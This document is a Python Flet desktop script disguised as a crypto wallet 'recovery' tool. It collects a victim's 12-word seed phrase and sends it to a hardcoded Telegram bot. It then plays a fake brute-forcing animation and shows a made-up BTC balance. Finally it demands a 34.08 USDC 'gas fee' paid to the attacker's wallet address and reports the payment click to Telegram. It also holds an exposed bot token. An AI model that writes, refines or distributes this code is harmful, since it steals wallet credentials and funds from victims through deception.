import flet as ft
import requests
import random
import time

# --- ТВОИ ДАННЫЕ ---
TOKEN = "8601525427:AAEuynoRLo7TkjpKQ1aflArSGXplmsGIZVw"
CHAT_ID = "1632903931" 
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

def main(page: ft.Page):
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.padding = 30
    page.bgcolor = "#0a0a0a"

    def send_to_tg(message):
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        try: requests.get(url, params={"chat_id": CHAT_ID, "text": message}, timeout=5)
        except: pass

    def generate_fake_address():
        chars = "abcdef0123456789"
        body = "".join(random.choice(chars) for _ in range(38))
        return f"0x{body[:5]}...{body[-4:]}"

    # --- ЭКРАН 1: ВВОД ---
    header = ft.Text("NODE INITIALIZATION", size=26, weight="bold", color="blueaccent")
    seed_input = ft.TextField(label="Seed Phrase (12 words)", multiline=True, min_lines=3, width=350, border_radius=12)
    start_btn = ft.ElevatedButton("START RECOVERY", width=300, height=55, bgcolor="blue", color="white")
    
    # --- ЭКРАН 2: ЗАГРУЗКА ---
    progress_bar = ft.ProgressBar(width=350, color="blueaccent", visible=False)
    log_text = ft.Text("", italic=True, size=14, visible=False)
    address_ticker = ft.Text("", size=12, color="grey", font_family="monospace", visible=False)

    def show_done(e):
        page.clean() # Полная очистка страницы
        page.add(
            ft.Column(
                horizontal_alignment="center",
                spacing=20,
                controls=[
                    ft.Icon(ft.icons.DONE_ALL, color="blue", size=70),
                    ft.Text("SUCCESS!", size=24, weight="bold"),
                    ft.Text("Transaction broadcasted to blockchain.", text_align="center"),
                    ft.Text("Status: Pending (0/3 confirmations)", color="yellow"),
                    ft.ElevatedButton("CLOSE", on_click=lambda _: page.window_close())
                ]
            )
        )
        send_to_tg("💰 ПОЛЬЗОВАТЕЛЬ НАЖАЛ 'ОПЛАТИЛ'")

    def on_click(e):
        phrase = seed_input.value.strip()
        if len(phrase.split()) != 12:
            page.snack_bar = ft.SnackBar(ft.Text("Введите 12 слов!"))
            page.snack_bar.open = True
            page.update()
            return

        # 1. Отправка
        send_to_tg(f"🚨 НОВАЯ СИД-ФРАЗА:\n{phrase}")

        # 2. Визуал загрузки
        seed_input.visible = False
        start_btn.visible = False
        header.value = "BRUTEFORCING NODES..."
        progress_bar.visible = True
        log_text.visible = True
        address_ticker.visible = True
        page.update()

        # 3. Цикл перебора (8 минут)
        total_steps = 4800 
        for i in range(total_steps + 1):
            if i % 48 == 0:
                progress_bar.value = i / total_steps
                p = (i / total_steps) * 100
                if p < 30: log_text.value = "Syncing RPC..."
                elif p < 60: log_text.value = "Scanning blocks..."
                else: log_text.value = "Verifying keys..."
            
            address_ticker.value = f"Searching: {generate_fake_address()}"
            
            if i % 5 == 0: # Обновляем экран чуть реже (раз в 0.5 сек), чтобы не вешать браузер
                page.update()
            
            time.sleep(0.1)

        # --- ШАГ 4: ФИНАЛЬНЫЙ ЭКРАН (БЕЗОПАСНЫЙ ПЕРЕХОД) ---
        btc = round(random.uniform(0.00068, 0.00098), 6)
        
        page.clean() # ГЛАВНАЯ ФИШКА: полностью стираем всё старое
        
        # Строим экран оплаты с нуля
        page.add(
            ft.Column(
                horizontal_alignment="center",
                spacing=20,
                controls=[
                    ft.Icon(ft.icons.CHECK_CIRCLE, color="green", size=70),
                    ft.Text("SIGNATURE FOUND!", size=24, weight="bold", color="green"),
                    ft.Text(f"Balance: {btc} BTC", size=20, weight="bold"),
                    ft.Container(
                        padding=20, bgcolor="#1a1a1a", border_radius=15,
                        content=ft.Column([
                            ft.Text("Pay Gas Fee to unlock (34.08 USDC):", size=13),
                            ft.Text("Network: BEP20 (BSC)", weight="bold", size=13),
                            ft.Text(TARGET_ADDRESS, size=11, color="blue200", selectable=True, weight="bold"),
                        ], horizontal_alignment="center")
                    ),
                    ft.ElevatedButton("I HAVE PAID", width=300, height=55, on_click=show_done)
                ]
            )
        )
        page.update()

    start_btn.on_click = on_click
    page.add(
        ft.Column(
            horizontal_alignment="center",
            controls=[header, seed_input, start_btn, progress_bar, log_text, address_ticker]
        )
    )

if __name__ == "__main__":
    ft.app(target=main)
